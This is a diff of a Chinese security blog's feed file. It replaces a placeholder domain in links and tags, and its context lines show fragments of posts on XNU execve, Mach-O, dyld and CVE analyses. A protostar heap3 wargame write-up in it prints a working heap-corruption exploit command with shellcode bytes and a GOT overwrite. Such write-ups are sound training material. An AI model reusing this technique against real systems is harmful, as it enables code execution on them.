kauth_authorize_fileop(vfs_context_ucred(imgp-&gt;ip_vfs_context),</span><br><span class="line">					KAUTH_FILEOP_EXEC,</span><br><span class="line">					(<span class="keyword">uintptr_t</span>)ndp-&gt;ni_vp, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">	proc_transend(p, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bad_notrans:</span><br><span class="line">	<span class="keyword">if</span> (imgp-&gt;ip_strings)</span><br><span class="line">		execargs_free(imgp);</span><br><span class="line">	<span class="keyword">if</span> (imgp-&gt;ip_ndp)</span><br><span class="line">		nameidone(imgp-&gt;ip_ndp);</span><br><span class="line">	<span class="keyword">if</span> (ndp)</span><br><span class="line">		FREE(ndp, M_TEMP);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这个函数主要做的事情就是寻找并拷贝<strong>可执行文件</strong>到内存中，并且根据可执行文件的类型调用不同的解析函数。osx总共支持三种可执行文件。他们各自有对应的处理函数。</p>
 <ul>
-<li><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">mach-o</a>：exec_mach_imgact</li>
+<li><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-o</a>：exec_mach_imgact</li>
 <li><a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E4%BA%8C%E8%BF%9B%E5%88%B6" target="_blank" rel="external">Fat Binary</a>：exec_fat_imgact</li>
 <li>Interpreter Script：exec_shell_imgact</li>
 </ul>
@@ -507,7 +507,7 @@
 <li>解析成功之后，用新申请的内存替换旧的内存。</li>
 </ul>
 <h2 id="1-5_parse_machfile">1.5 parse_machfile</h2><p>这个函数做的事情就非常的简单清楚了，就是将<code>macho</code>文件解析，并且映射到内存中。</p>
-<p>在我的<a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/#0x03_Load_Commands" target="_blank" rel="external">macho文件格式分析</a>中已经分析过这一块代码了。这里就不复述了。</p>
+<p>在我的<a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/#0x03_Load_Commands">macho文件格式分析</a>中已经分析过这一块代码了。这里就不复述了。</p>
 <h1 id="0x02_小结">0x02 小结</h1><p>通过对整个流程源码的一次简单梳理，大致明白了整个流程在源码中是怎么样实现的，在研究这方面的漏洞的时候可以更快的明白问题出在哪里，也可能更深刻的理解漏洞的成因以及重现的方法。</p>
 ]]></content>
     <summary type="html">
@@ -522,22 +522,22 @@
     
     </summary>
     
-      <category term="OSX" scheme="http://yoursite.com/tags/OSX/"/>
+      <category term="OSX" scheme="http://turingh.github.io/tags/OSX/"/>
     
-      <category term="execve" scheme="http://yoursite.com/tags/execve/"/>
+      <category term="execve" scheme="http://turingh.github.io/tags/execve/"/>
     
-      <category term="kernel" scheme="http://yoursite.com/tags/kernel/"/>
+      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
     
-      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
+      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[fishhook源码分析]]></title>
-    <link href="http://yoursite.com/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2016/03/22/fishhook源码分析/</id>
+    <link href="http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    <id>http://turingh.github.io/2016/03/22/fishhook源码分析/</id>
     <published>2016-03-22T15:14:53.000Z</published>
     <updated>2016-03-24T03:35:54.000Z</updated>
     <content type="html"><![CDATA[<p>没什么特别要说的，详细看代码，可以结合之前的两篇文章，更好的理解这部分内容。</p>
@@ -570,22 +570,22 @@
     
     </summary>
     
-      <category term="dyld" scheme="http://yoursite.com/tags/dyld/"/>
+      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
     
-      <category term="hook" scheme="http://yoursite.com/tags/hook/"/>
+      <category term="hook" scheme="http://turingh.github.io/tags/hook/"/>
     
-      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
+      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
     
-      <category term="osx" scheme="http://yoursite.com/tags/osx/"/>
+      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[dyld源码分析-动态加载load]]></title>
-    <link href="http://yoursite.com/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/"/>
-    <id>http://yoursite.com/2016/03/16/dyld源码分析load/</id>
+    <link href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/"/>
+    <id>http://turingh.github.io/2016/03/16/dyld源码分析load/</id>
     <published>2016-03-16T19:13:52.000Z</published>
     <updated>2016-03-24T03:35:50.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在<code>OS X</code>或者<code>IOS</code>上运行一个程序时，dyld除了需要加载主要的执行程序之外，还需要加载需要的库文件以及库文件依赖的库文件。</p>
@@ -672,22 +672,22 @@
     
     </summary>
     
-      <category term="dlopen" scheme="http://yoursite.com/tags/dlopen/"/>
+      <category term="dlopen" scheme="http://turingh.github.io/tags/dlopen/"/>
     
-      <category term="dyld" scheme="http://yoursite.com/tags/dyld/"/>
+      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
     
-      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
+      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
     
-      <category term="osx" scheme="http://yoursite.com/tags/osx/"/>
+      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[Mach-O的动态链接相关知识]]></title>
-    <link href="http://yoursite.com/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
-    <id>http://yoursite.com/2016/03/10/Mach-O的动态链接/</id>
+    <link href="http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
+    <id>http://turingh.github.io/2016/03/10/Mach-O的动态链接/</id>
     <published>2016-03-10T16:40:02.000Z</published>
     <updated>2016-03-24T03:37:40.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>通过分析<code>Mach-O</code>的动态链接过程，加深对<code>Mach-O</code>文件结构的理解。对Mach-O文件格式的简单的分析看这里<a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">这里</a>。</p>
@@ -756,22 +756,22 @@
     
     </summary>
     
-      <category term="dyld" scheme="http://yoursite.com/tags/dyld/"/>
+      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
     
-      <category term="dynamic link" scheme="http://yoursite.com/tags/dynamic-link/"/>
+      <category term="dynamic link" scheme="http://turingh.github.io/tags/dynamic-link/"/>
     
-      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
+      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
     
-      <category term="osx" scheme="http://yoursite.com/tags/osx/"/>
+      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[mach-o格式分析]]></title>
-    <link href="http://yoursite.com/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2016/03/07/mach-o文件格式分析/</id>
+    <link href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
+    <id>http://turingh.github.io/2016/03/07/mach-o文件格式分析/</id>
     <published>2016-03-07T16:18:09.000Z</published>
     <updated>2016-03-24T03:37:29.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
@@ -1004,18 +1004,18 @@
     
     </summary>
     
-      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
+      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
     
-      <category term="osx" scheme="http://yoursite.com/tags/osx/"/>
+      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[CVE-2016-0799简单分析]]></title>
-    <link href="http://yoursite.com/2016/03/03/CVE-2016-0799%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2016/03/03/CVE-2016-0799简单分析/</id>
+    <link href="http://turingh.github.io/2016/03/03/CVE-2016-0799%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
+    <id>http://turingh.github.io/2016/03/03/CVE-2016-0799简单分析/</id>
     <published>2016-03-03T16:12:47.000Z</published>
     <updated>2016-03-24T03:35:35.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><p>最近openssl又除了一系列问题，具体可以看<a href="https://drownattack.com/#faq-practical" target="_blank" rel="external">这里</a>。<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0799" target="_blank" rel="external">CVE-2016-0799</a>只是其中一个比较简单的漏洞。造成漏洞的原因主要有两个。</p>
@@ -1084,18 +1084,18 @@
     
     </summary>
     
-      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
+      <category term="heap" scheme="http://turingh.github.io/tags/heap/"/>
     
-      <category term="openssl" scheme="http://yoursite.com/tags/openssl/"/>
+      <category term="openssl" scheme="http://turingh.github.io/tags/openssl/"/>
     
-      <category term="CVE" scheme="http://yoursite.com/categories/CVE/"/>
+      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[dyld中mach-o文件加载的简单分析]]></title>
-    <link href="http://yoursite.com/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2016/03/01/dyld中macho加载的简单分析/</id>
+    <link href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
+    <id>http://turingh.github.io/2016/03/01/dyld中macho加载的简单分析/</id>
     <published>2016-03-01T22:06:57.000Z</published>
     <updated>2016-03-24T03:35:46.000Z</updated>
     <content type="html"><![CDATA[<p>[TOC]</p>
@@ -1196,20 +1196,20 @@
     
     </summary>
     
-      <category term="dyld" scheme="http://yoursite.com/tags/dyld/"/>
+      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
     
-      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
+      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
     
-      <category term="osx" scheme="http://yoursite.com/tags/osx/"/>
+      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[OS X 内核研究 准备知识]]></title>
-    <link href="http://yoursite.com/2016/02/29/OS-X-%E5%86%85%E6%A0%B8%E7%A0%94%E7%A9%B6-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
-    <id>http://yoursite.com/2016/02/29/OS-X-内核研究-基础知识/</id>
+    <link href="http://turingh.github.io/2016/02/29/OS-X-%E5%86%85%E6%A0%B8%E7%A0%94%E7%A9%B6-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
+    <id>http://turingh.github.io/2016/02/29/OS-X-内核研究-基础知识/</id>
     <published>2016-02-29T22:20:48.000Z</published>
     <updated>2016-03-24T03:37:43.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><blockquote>
@@ -1306,18 +1306,18 @@
     
     </summary>
     
-      <category term="OSX" scheme="http://yoursite.com/tags/OSX/"/>
+      <category term="OSX" scheme="http://turingh.github.io/tags/OSX/"/>
     
-      <category term="kernel" scheme="http://yoursite.com/tags/kernel/"/>
+      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[通过fusion level02浅谈exploit中的函数调用伪造]]></title>
-    <link href="http://yoursite.com/2016/02/23/%E9%80%9A%E8%BF%87fusion%20level02%E6%B5%85%E8%B0%88exploit%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%BC%AA%E9%80%A0/"/>
-    <id>http://yoursite.com/2016/02/23/通过fusion level02浅谈exploit中的函数调用伪造/</id>
+    <link href="http://turingh.github.io/2016/02/23/%E9%80%9A%E8%BF%87fusion%20level02%E6%B5%85%E8%B0%88exploit%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%BC%AA%E9%80%A0/"/>
+    <id>http://turingh.github.io/2016/02/23/通过fusion level02浅谈exploit中的函数调用伪造/</id>
     <published>2016-02-23T14:45:47.000Z</published>
     <updated>2016-03-24T03:39:19.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><p>​       通过一道<a href="https://exploit-exercises.com/fusion/level02/" target="_blank" rel="external">exploit-exercises</a>中的题目的解答来体会frame faking在实际的利用中的使用技巧。通过实践了网上的两个writeup并进行分析，加深理解做了简单的总结。</p>
@@ -1408,24 +1408,24 @@
     
     </summary>
     
-      <category term="exploit" scheme="http://yoursite.com/tags/exploit/"/>
+      <category term="exploit" scheme="http://turingh.github.io/tags/exploit/"/>
     
-      <category term="frame-faking" scheme="http://yoursite.com/tags/frame-faking/"/>
+      <category term="frame-faking" scheme="http://turingh.github.io/tags/frame-faking/"/>
     
-      <category term="level02" scheme="http://yoursite.com/tags/level02/"/>
+      <category term="level02" scheme="http://turingh.github.io/tags/level02/"/>
     
-      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
+      <category term="stack" scheme="http://turingh.github.io/tags/stack/"/>
     
-      <category term="wargame" scheme="http://yoursite.com/tags/wargame/"/>
+      <category term="wargame" scheme="http://turingh.github.io/tags/wargame/"/>
     
-      <category term="fusion" scheme="http://yoursite.com/categories/fusion/"/>
+      <category term="fusion" scheme="http://turingh.github.io/categories/fusion/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[对CVE-2015-7547简单的分析与调试]]></title>
-    <link href="http://yoursite.com/2016/02/19/CVE-2015-7547%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
-    <id>http://yoursite.com/2016/02/19/CVE-2015-7547分析与调试/</id>
+    <link href="http://turingh.github.io/2016/02/19/CVE-2015-7547%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
+    <id>http://turingh.github.io/2016/02/19/CVE-2015-7547分析与调试/</id>
     <published>2016-02-19T18:21:22.000Z</published>
     <updated>2016-03-24T03:35:30.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_漏洞信息">0x00 漏洞信息</h1><p>​    最近glibc有一个栈溢出的漏洞具体情况，漏洞的具体信息可以参考下面两个链接。</p>
@@ -1504,24 +1504,24 @@
     
     </summary>
     
-      <category term="dns" scheme="http://yoursite.com/tags/dns/"/>
+      <category term="dns" scheme="http://turingh.github.io/tags/dns/"/>
     
-      <category term="gethostbyname" scheme="http://yoursite.com/tags/gethostbyname/"/>
+      <category term="gethostbyname" scheme="http://turingh.github.io/tags/gethostbyname/"/>
     
-      <category term="glibc" scheme="http://yoursite.com/tags/glibc/"/>
+      <category term="glibc" scheme="http://turingh.github.io/tags/glibc/"/>
     
-      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
+      <category term="linux" scheme="http://turingh.github.io/tags/linux/"/>
     
-      <category term="stackoverflow" scheme="http://yoursite.com/tags/stackoverflow/"/>
+      <category term="stackoverflow" scheme="http://turingh.github.io/tags/stackoverflow/"/>
     
-      <category term="CVE" scheme="http://yoursite.com/categories/CVE/"/>
+      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[对CVE-2015-7547简单的分析与调试]]></title>
-    <link href="http://yoursite.com/2016/02/19/CVE-2015-7547%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95%E5%89%AF%E6%9C%AC/"/>
-    <id>http://yoursite.com/2016/02/19/CVE-2015-7547分析与调试副本/</id>
+    <link href="http://turingh.github.io/2016/02/19/CVE-2015-7547%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95%E5%89%AF%E6%9C%AC/"/>
+    <id>http://turingh.github.io/2016/02/19/CVE-2015-7547分析与调试副本/</id>
     <published>2016-02-19T18:21:22.000Z</published>
     <updated>2016-03-24T03:35:30.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_漏洞信息">0x00 漏洞信息</h1><p>​    最近glibc有一个栈溢出的漏洞具体情况，漏洞的具体信息可以参考下面两个链接。</p>
@@ -1600,24 +1600,24 @@
     
     </summary>
     
-      <category term="dns" scheme="http://yoursite.com/tags/dns/"/>
+      <category term="dns" scheme="http://turingh.github.io/tags/dns/"/>
     
-      <category term="gethostbyname" scheme="http://yoursite.com/tags/gethostbyname/"/>
+      <category term="gethostbyname" scheme="http://turingh.github.io/tags/gethostbyname/"/>
     
-      <category term="glibc" scheme="http://yoursite.com/tags/glibc/"/>
+      <category term="glibc" scheme="http://turingh.github.io/tags/glibc/"/>
     
-      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
+      <category term="linux" scheme="http://turingh.github.io/tags/linux/"/>
     
-      <category term="stackoverflow" scheme="http://yoursite.com/tags/stackoverflow/"/>
+      <category term="stackoverflow" scheme="http://turingh.github.io/tags/stackoverflow/"/>
     
-      <category term="CVE" scheme="http://yoursite.com/categories/CVE/"/>
+      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[CVE-2016-1879 调试&分析]]></title>
-    <link href="http://yoursite.com/2016/02/09/CVE-2016-1879%E8%B0%83%E8%AF%95&%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2016/02/09/CVE-2016-1879调试&分析/</id>
+    <link href="http://turingh.github.io/2016/02/09/CVE-2016-1879%E8%B0%83%E8%AF%95&%E5%88%86%E6%9E%90/"/>
+    <id>http://turingh.github.io/2016/02/09/CVE-2016-1879调试&分析/</id>
     <published>2016-02-09T22:23:13.000Z</published>
     <updated>2016-03-24T03:35:40.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_漏洞介绍">0x00 漏洞介绍</h1><p>​    <a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html" target="_blank" rel="external">CVE-2016-1879</a>是一个会导致freebsd内核崩溃的一个漏洞。漏洞的具体细节看<a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html" target="_blank" rel="external">这里</a>。</p>
@@ -1700,18 +1700,18 @@
     
     </summary>
     
-      <category term="dos" scheme="http://yoursite.com/tags/dos/"/>
+      <category term="dos" scheme="http://turingh.github.io/tags/dos/"/>
     
-      <category term="freebsd" scheme="http://yoursite.com/tags/freebsd/"/>
+      <category term="freebsd" scheme="http://turingh.github.io/tags/freebsd/"/>
     
-      <category term="CVE" scheme="http://yoursite.com/categories/CVE/"/>
+      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[frame-faking-介绍-函数调用伪造]]></title>
-    <link href="http://yoursite.com/2016/01/27/frame-faking/"/>
-    <id>http://yoursite.com/2016/01/27/frame-faking/</id>
+    <link href="http://turingh.github.io/2016/01/27/frame-faking/"/>
+    <id>http://turingh.github.io/2016/01/27/frame-faking/</id>
     <published>2016-01-27T16:02:32.000Z</published>
     <updated>2016-03-24T03:35:58.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_frame-faking"><strong>0x00</strong>  frame-faking</h1><p>在处理<a href="https://exploit-exercises.com/fusion/" target="_blank" rel="external">fusion</a>的<a href="https://exploit-exercises.com/fusion/level02/" target="_blank" rel="external">level02</a>时遇到新的问题，需要了解frame-faking的原理，查阅了一些资料。</p>
@@ -1853,18 +1853,18 @@
     
     </summary>
     
-      <category term="exploit" scheme="http://yoursite.com/tags/exploit/"/>
+      <category term="exploit" scheme="http://turingh.github.io/tags/exploit/"/>
     
-      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
+      <category term="stack" scheme="http://turingh.github.io/tags/stack/"/>
     
-      <category term="fusion" scheme="http://yoursite.com/categories/fusion/"/>
+      <category term="fusion" scheme="http://turingh.github.io/categories/fusion/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法]]></title>
-    <link href="http://yoursite.com/2015/12/14/protostar-heap3/"/>
-    <id>http://yoursite.com/2015/12/14/protostar-heap3/</id>
+    <link href="http://turingh.github.io/2015/12/14/protostar-heap3/"/>
+    <id>http://turingh.github.io/2015/12/14/protostar-heap3/</id>
     <published>2015-12-14T20:57:02.000Z</published>
     <updated>2016-03-24T03:38:34.000Z</updated>
     <content type="html"><![CDATA[<h1 id="1_源码">1 源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a, *b, *c;</span><br><span class="line"></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1891,22 +1891,22 @@
 <p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_exploit.png" alt="溢出后的free(c)"></p>
 <p>所以此题的答案也就出来了。</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/tmp$ ./bin/heap3 `python -c "print '\x90'*10 + '\x68\x64\x88\x04\x08\xc3'"` `python -c "print 'A'*32 + '\xfc\xff\xff\xff'*2 + 'CCCC' + '\x1c\xb1\x04\x08' + '\x04\xc0\x04\x08' "` F</span><br><span class="line">that wasn't too bad now, was it? @ 1449484612</span><br></pre></td></tr></table></figure>
-<p>具体的shellcode地址，<a href="http://BLOGIMAGE/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">DWORDSHOOT</a>如何构建，再之前的基础学习之后应该不需要想家复述，如有不明看<a href="http://turingh.github.io/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">这里</a>。</p>
+<p>具体的shellcode地址，<a href="http://BLOGIMAGE/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">DWORDSHOOT</a>如何构建，再之前的基础学习之后应该不需要想家复述，如有不明看<a href="http://turingh.github.io/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/">这里</a>。</p>
 ]]></content>
     <summary type="html">
     <![CDATA[<h1 id="1_源码">1 源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a, *b, *c;</span><br><span class="line"></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span 